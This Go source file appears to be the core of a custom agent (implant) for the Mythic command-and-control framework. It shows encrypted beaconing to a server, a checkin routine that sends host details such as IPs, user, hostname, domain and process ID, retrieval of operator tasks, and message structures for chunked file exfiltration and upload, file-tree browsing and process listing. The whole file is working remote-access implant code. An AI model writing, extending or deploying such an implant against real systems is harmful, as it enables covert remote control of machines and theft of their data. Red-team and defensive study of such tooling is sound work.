package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
)

// Agent holds live session state: negotiated callback UUID, config and keys.
type Agent struct {
	cfg       Config
	uuid      string
	psk       []byte
	transport exchanger
	interval  int
	jitter    int
	// post sends responses; handlers use it so transfers post chunks
	// mid-task. Tests override it with a fake; nil means postResponses.
	post poster
}

func newAgent(c Config) (*Agent, error) {
	t, err := newTransport(c)
	if err != nil {
		return nil, err
	}
	var psk []byte
	if c.Crypto == "aes256_hmac" {
		psk, err = base64.StdEncoding.DecodeString(c.PSK)
		if err != nil {
			return nil, fmt.Errorf("psk: %w", err)
		}
	}
	interval := c.CallbackInterval
	if interval < 0 {
		interval = 0
	}
	a := &Agent{cfg: c, uuid: c.PayloadUUID, psk: psk, transport: t, interval: interval, jitter: c.CallbackJitter}
	a.post = a.postResponses
	return a, nil
}

// posterFor returns the response poster, defaulting to the live one.
func (a *Agent) posterFor() poster {
	if a.post != nil {
		return a.post
	}
	return a.postResponses
}

// chunkSize returns this callback's file-transfer chunk size.
func (a *Agent) chunkSize() int {
	return chunkSizeFor(a.cfg.Profile)
}

func (a *Agent) roundTrip(outerUUID string, payload any) ([]byte, error) {
	msg, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}
	sealed, err := sealRaw(outerUUID, msg, a.cfg.Crypto, a.psk)
	if err != nil {
		return nil, err
	}
	raw, err := a.transport.exchange(sealed)
	if err != nil {
		return nil, err
	}
	_, out, err := openRaw(raw, a.cfg.Crypto, a.psk)
	return out, err
}

type checkinResponse struct {
	Action string `json:"action"`
	ID     string `json:"id"`
	Status string `json:"status"`
}

// checkin registers the payload and adopts the callback UUID Mythic returns.
func (a *Agent) checkin() error {
	info := collectSysinfo()
	payload := map[string]any{
		"action":       "checkin",
		"uuid":         a.cfg.PayloadUUID,
		"ips":          info.ips,
		"os":           info.os,
		"user":         info.user,
		"host":         info.host,
		"pid":          info.pid,
		"architecture": info.arch,
		"domain":       info.domain,
		"process_name": info.process,
	}
	out, err := a.roundTrip(a.cfg.PayloadUUID, payload)
	if err != nil {
		return err
	}
	var resp checkinResponse
	if err := json.Unmarshal(out, &resp); err != nil {
		return err
	}
	if resp.Status != "success" || resp.ID == "" {
		return fmt.Errorf("checkin rejected: status=%q", resp.Status)
	}
	a.uuid = resp.ID
	return nil
}

// Task is one Mythic tasking entry. Parameters arrives as a JSON blob string.
type Task struct {
	Command    string  `json:"command"`
	Parameters string  `json:"parameters"`
	ID         string  `json:"id"`
	Timestamp  float64 `json:"timestamp"`
}

type taskingResponse struct {
	Action string `json:"action"`
	Tasks  []Task `json:"tasks"`
}

func (a *Agent) getTasking() ([]Task, error) {
	out, err := a.roundTrip(a.uuid, map[string]any{
		"action":       "get_tasking",
		"tasking_size": a.cfg.TaskingSize,
	})
	if err != nil {
		return nil, err
	}
	var resp taskingResponse
	if err := json.Unmarshal(out, &resp); err != nil {
		return nil, err
	}
	return resp.Tasks, nil
}

// Response is one completed task result for post_response. The optional
// keys drive Mythic core directly: file_browser populates the file tree,
// removed_files prunes it, download/upload run chunked file transfers,
// processes feeds the process browser, artifacts files IOCs.
type Response struct {
	TaskID       string           `json:"task_id"`
	UserOutput   string           `json:"user_output"`
	Completed    bool             `json:"completed"`
	Status       string           `json:"status"`
	FileBrowser  *FileBrowser     `json:"file_browser,omitempty"`
	RemovedFiles *[]RemovedFile   `json:"removed_files,omitempty"`
	Download     *DownloadPayload `json:"download,omitempty"`
	Upload       *UploadPayload   `json:"upload,omitempty"`
	Processes    *[]ProcessEntry  `json:"processes,omitempty"`
	Artifacts    *[]Artifact      `json:"artifacts,omitempty"`
}

// Artifact is one IOC Mythic files from a task response.
type Artifact struct {
	BaseArtifact string `json:"base_artifact"`
	Artifact     string `json:"artifact"`
}

// FilePerms is the permission metadata stored with a file tree entry.
type FilePerms struct {
	ReadOnly bool `json:"read_only"`
}

// FileChild is one entry inside a file_browser listing.
type FileChild struct {
	IsFile      bool      `json:"is_file"`
	Name        string    `json:"name"`
	Size        uint64    `json:"size"`
	AccessTime  *uint64   `json:"access_time,omitempty"`
	ModifyTime  uint64    `json:"modify_time"`
	Permissions FilePerms `json:"permissions"`
}

// FileBrowser is the listing object Mythic files into its tree.
type FileBrowser struct {
	Host        string       `json:"host"`
	IsFile      bool         `json:"is_file"`
	Name        string       `json:"name"`
	ParentPath  string       `json:"parent_path"`
	Success     *bool        `json:"success,omitempty"`
	Size        uint64       `json:"size"`
	AccessTime  *uint64      `json:"access_time,omitempty"`
	ModifyTime  uint64       `json:"modify_time"`
	Permissions FilePerms    `json:"permissions"`
	Files       *[]FileChild `json:"files,omitempty"`
}

// RemovedFile prunes one path from the file tree.
type RemovedFile struct {
	Path string `json:"path"`
}

// ProcessEntry is one row of a processes listing for the process browser.
type ProcessEntry struct {
	ProcessID       int    `json:"process_id"`
	ParentProcessID int    `json:"parent_process_id"`
	Architecture    string `json:"architecture,omitempty"`
	BinPath         string `json:"bin_path,omitempty"`
	Name            string `json:"name"`
	User            string `json:"user,omitempty"`
	CommandLine     string `json:"command_line,omitempty"`
	IntegrityLevel  int    `json:"integrity_level,omitempty"`
	StartTime       uint64 `json:"start_time,omitempty"`
	Description     string `json:"description,omitempty"`
	Signer          string `json:"signer,omitempty"`
}

// DownloadPayload carries one agent -> Mythic file chunk (1-based).
type DownloadPayload struct {
	TotalChunks *int    `json:"total_chunks,omitempty"`
	ChunkSize   *int    `json:"chunk_size,omitempty"`
	ChunkData   *string `json:"chunk_data,omitempty"`
	ChunkNum    *int    `json:"chunk_num,omitempty"`
	FullPath    *string `json:"full_path,omitempty"`
	FileName    *string `json:"filename,omitempty"`
	FileID      *string `json:"file_id,omitempty"`
	Host        *string `json:"host,omitempty"`
}

// UploadPayload requests one Mythic -> agent file chunk (1-based).
type UploadPayload struct {
	ChunkSize *int    `json:"chunk_size,omitempty"`
	ChunkNum  int     `json:"chunk_num"`
	FullPath  *string `json:"full_path,omitempty"`
	FileID    *string `json:"file_id,omitempty"`
	Host      *string `json:"host,omitempty"`
}

// PostReply is one entry of Mythic's post_response reply. Transfers read
// file_id / chunk data back through it.
type PostReply struct {
	TaskID      string `json:"task_id"`
	Status      string `json:"status"`
	Error       string `json:"error"`
	FileID      string `json:"file_id"`
	ChunkNum    int    `json:"chunk_num"`
	TotalChunks int    `json:"total_chunks"`
	ChunkData   string `json:"chunk_data"`
}

func (a *Agent) postResponses(responses []Response) ([]PostReply, error) {
	out, err := a.roundTrip(a.uuid, map[string]any{
		"action":    "post_response",
		"responses": responses,
	})
	if err != nil {
		return nil, err
	}
	var parsed struct {
		Responses []PostReply `json:"responses"`
	}
	if err := json.Unmarshal(out, &parsed); err != nil {
		return nil, err
	}
	return parsed.Responses, nil
}

// taskArg extracts the "arguments" string from a task's parameters blob.
// Falls back to the raw string when parameters is not JSON.
func taskArg(parameters string) string {
	var decoded map[string]any
	if err := json.Unmarshal([]byte(parameters), &decoded); err != nil {
		return parameters
	}
	if v, ok := decoded["arguments"].(string); ok {
		return v
	}
	return parameters
}
